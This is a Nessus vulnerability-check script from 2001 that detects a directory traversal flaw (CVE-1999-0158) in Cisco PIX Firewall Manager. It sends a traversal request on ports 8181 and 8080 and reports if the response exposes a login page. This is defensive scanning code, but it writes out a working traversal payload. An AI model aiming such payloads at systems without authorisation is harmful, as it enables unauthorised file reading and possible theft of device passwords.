#
# This script was written by H D Moore <hdmoore@digitaldefense.net>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10819);
 script_bugtraq_id(691);
 script_version("$Revision: 1.11 $");
 script_cve_id("CVE-1999-0158");

 name["english"] = "PIX Firewall Manager Directory Traversal";
 script_name(english:name["english"], francais:name["francais"]);

 desc["english"] = "
Synopsis :

It is possible to read arbitrary files on the remote host
through the remote web server.

Description :

It is possible to read arbitrary files on this machine by using
relative paths in the URL. This flaw can be used to bypass the
management software's password protection and possibly retrieve
the enable password for the Cisco PIX.

This vulnerability has been assigned Cisco Bug ID: CSCdk39378.

Solution : 

Cisco originally recommended upgrading to version 4.1.6b or version 
4.2, however the same vulnerability has been found in version 4.3. 
Cisco now recommends that you disable the software completely and 
migrate to the new PIX Device Manager software.

Risk factor :

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";


 script_description(english:desc["english"]);

 summary["english"] = "\..\..\file.txt";
 summary["francais"] = "\..\..\file.txt";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Digital Defense Inc.",
                francais:"Ce script est Copyright (C) 2001 Digital Defense Inc.");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8181);
 exit(0);
}
 
#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:8181);
ports = add_port_in_list(list:get_kb_list("Services/www"), port:8080);

foreach port (ports)
{
    req = http_get(item:string("/..\\pixfir~1\\how_to_login.html"), port:port);
    r   = http_keepalive_send_recv(port:port, data:req);
    if(r && "How to login" >< r) security_warning(port);
}
